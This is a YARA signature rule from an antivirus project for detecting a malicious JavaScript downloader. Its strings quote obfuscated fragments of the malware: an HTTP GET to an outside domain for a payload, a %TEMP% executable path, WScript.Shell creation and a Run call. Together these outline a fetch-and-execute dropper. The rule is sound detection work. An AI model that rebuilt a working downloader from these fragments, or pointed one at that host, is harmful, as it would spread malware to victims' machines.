rule sig_20160328_25bd4dcb3f56b7f14bf62db1efc1b29c {
  meta:
    description = "datamaliciousorder - file 20160328_25bd4dcb3f56b7f14bf62db1efc1b29c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "45644b0744c7ba023c2482a7eb4f81c1d419f1903d73f8127ccc4172396a7de1"

  strings:
    $s1  = "function Tsypbn() {return Bhuotylac[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"mqXba2stFR.exe\";};" fullword ascii
    $s2  = "do {WScript[Iffje](Hbydmyw() * 11)} while (Hszgkbqwm[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Bhuotylac = function Rakipmqedc() {return WScript[Tokclmqd](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Xtzuku(Kuhexupl, Hszgr){return Kuhexupl - Hszgr;};" fullword ascii
    $s5  = "Hszgkbqwm[Tgjcanbrqm](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s6  = "function Nkgbmz() {return ((Lseoezew == true) && (Lseoezew == Yineeylarf)) ? 1 : Eiskj;};" fullword ascii
    $s7  = "function Fplpb(Tgtwomhsal){Bhuotylac[\"Run\"](Tgtwomhsal, Eiskj, Eiskj);};" fullword ascii
    $s8  = "return Xtzuku(Rnifl, Nnhptul);" fullword ascii
    $s9  = "function Znwgq(){return Bneqhx;};" fullword ascii
    $s10 = "var Imtntwa = false;" fullword ascii
    $s11 = "Yineeylarf = true; " fullword ascii
    $s12 = "var Lseoezew = false;" fullword ascii
    $s13 = "var Yineeylarf = false;" fullword ascii
    $s14 = "function Wrotrbrazx(){return Tokclmqd;};" fullword ascii
    $s15 = "var Vtdkd = new this[\"Date\"]();" fullword ascii
    $s16 = "function Yvnota()" fullword ascii
    $s17 = "function Lbruwgso(Yppnxbalm) {var Opbxjr = (1, 2, 3, 4, 5, Yppnxbalm); return Opbxjr;};" fullword ascii
    $s18 = " while (Ffnwera){" fullword ascii
    $s19 = "Lseoezew = true; " fullword ascii
    $s20 = "function Hbydmyw(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}